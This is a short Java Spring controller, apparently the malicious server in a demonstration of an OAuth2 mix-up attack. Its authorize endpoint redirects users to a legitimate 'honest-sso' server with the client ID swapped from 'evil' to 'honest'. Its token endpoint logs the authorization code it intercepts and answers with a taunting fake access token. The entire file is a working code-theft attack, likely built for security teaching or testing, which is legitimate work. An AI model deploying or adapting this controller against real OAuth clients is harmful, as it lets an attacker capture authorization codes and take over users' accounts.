package com.example.evil;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class HomeController {
	@GetMapping("/")
	public String index() {
		return "hello";
	}

	@GetMapping("/oauth2/authorize")
	public String authorize(
			@RequestParam("response_type") String responseType,
			@RequestParam("client_id") String clientId,
			@RequestParam("scope") String scope,
			@RequestParam("state") String state,
			@RequestParam("redirect_uri") String redirectUri) {
		return String.format(
				"redirect:http://honest-sso:9000/oauth2/authorize?response_type=%s&client_id=%s&scope=%s&state=%s&redirect_uri=%s",
				responseType,
				clientId.replace("evil", "honest"),
				scope,
				state,
				redirectUri
		);
	}

	@PostMapping(value = "/oauth2/token", produces = "application/json")
	@ResponseBody
	public String token(@RequestParam String code) {
		System.out.println("code = " + code);
		return "{\"access_token\":\"I have your code. You may leave now.\",\"refresh_token\":\"refresh\",\"scope\":\"scopes\",\"token_type\":\"Bearer\",\"expires_in\":\"300\"}";
	}
}
